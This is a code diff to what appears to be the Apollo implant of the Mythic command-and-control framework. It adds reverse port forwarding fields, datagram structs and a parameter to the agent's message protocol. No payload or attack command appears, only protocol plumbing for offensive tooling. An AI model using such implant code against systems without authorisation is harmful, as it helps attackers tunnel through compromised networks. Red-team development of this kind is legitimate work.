@@ -1,4 +1,4 @@
-﻿using System.Diagnostics;
+using System.Diagnostics;
 using Apollo.CommandModules;
 using System.Collections.Generic;
 using System.Threading;
@@ -256,13 +256,18 @@ namespace Mythic
             public Dictionary<string, string>[] delegates;
             public string message_id;
             public object socks;
+            public object rportfwds;
 
-            public TaskResponse(string _action, Apollo.Tasks.ApolloTaskResponse[] _responses, Dictionary<string, string>[] _delegates, string _message_id, object _socks)
+            public TaskResponse(string _action, Apollo.Tasks.ApolloTaskResponse[] _responses, Dictionary<string, string>[] _delegates, string _message_id, object _socks, object _rportfwds)
             {
                 action = _action;
                 responses = _responses;
                 delegates = _delegates;
                 message_id = _message_id;
+                if (_rportfwds == null)
+                    rportfwds = null;
+                else
+                    rportfwds = _rportfwds;
                 if (_socks == null)
                     socks = null;
                 else if (_socks.GetType() != typeof(SocksStartInfo) && _socks.GetType() != typeof(SocksStopInfo) && _socks.GetType() != typeof(SocksDatagram[]))
@@ -301,6 +306,16 @@ namespace Mythic
             public string data;
         }
 
+        public struct PortFwdDatagram
+        {
+            public Dictionary<String,Dictionary<String,Dictionary<String,Dictionary<String,List<String>>>>> data;
+        }
+
+        public struct PortSpecificDatagram
+        {
+            public Dictionary<String,Dictionary<String,Dictionary<String,List<String>>>> data;
+        }
+
         internal struct FileBrowserParameters
         {
             public string host;
@@ -326,6 +341,7 @@ namespace Mythic
             public Dictionary<string, string>[] delegates;
             public string message_id;
             public SocksDatagram[] socks;
+            public PortFwdDatagram[] rportfwds;
             // public DelegateMessages[] delegateMessages;
         }
 
@@ -351,6 +367,7 @@ namespace Mythic
             public Task[] Tasks;
             public DelegateMessage[] Delegates;
             public SocksDatagram[] SocksDatagrams;
+            public PortFwdDatagram[] PortFwdDg;
         }
     }
 
@@ -383,7 +400,7 @@ namespace Mythic
             public Crypto.Crypto cryptor;
             public abstract string SendResponse(string id, Apollo.Tasks.ApolloTaskResponse taskresp);
 
-            public abstract string SendResponses(string id, Apollo.Tasks.ApolloTaskResponse[] resps, SocksDatagram[] datagrams = null);
+            public abstract string SendResponses(string id, Apollo.Tasks.ApolloTaskResponse[] resps, SocksDatagram[] datagrams = null, PortFwdDatagram[] rdatagrams = null);
 
             public abstract bool Send(string id, string message);
 
